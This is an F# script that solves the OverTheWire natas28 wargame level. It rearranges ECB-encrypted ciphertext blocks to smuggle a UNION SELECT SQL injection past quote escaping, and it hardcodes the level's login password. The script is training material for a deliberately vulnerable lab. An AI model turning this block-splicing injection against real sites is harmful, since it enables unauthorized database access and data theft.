open System
open System.Net

let url = "http://natas28.natas.labs.overthewire.org/"
let credentials = "natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let blockSize, offsetSize, controlIndexStart = 16, 10, 3

let oracle (query: string) =
    let url = sprintf "%s?query=%s" url (WebUtility.UrlEncode(query))
    let http = HttpWebRequest.CreateHttp url
    http.Headers.Add(basicAuth)
    http.Method <- "HEAD"
    http.AllowAutoRedirect <- false

    let response =
        try
            http.GetResponse ()
        with | :? WebException as webEx ->
            webEx.Response
    let newUrl = response.Headers.["Location"]
    let query = WebUtility.UrlDecode(newUrl.Substring(newUrl.IndexOf("query=") + 6))
    Convert.FromBase64String query |> Array.chunkBySize blockSize

let toInject = "' UNION ALL SELECT * FROM Users #"
let paddedInject = toInject.PadRight (blockSize * 3 - toInject.Length, ' ')

// step 1, get encoded with escaped slash
let query = String.replicate offsetSize "x" + paddedInject
let data = oracle query

// step 2, piece together encoded
let index = controlIndexStart
let cipher = 
    let toInject = data.[index..index + 2] |> Array.concat |> Array.tail
    let prefix = data.[0..index - 1] |> Array.concat
    let postfix = data.[index + 3..] |> Array.concat
    Array.concat [prefix; toInject; postfix]

let queryCipher = Convert.ToBase64String cipher
printfn "%s" (WebUtility.UrlEncode(queryCipher))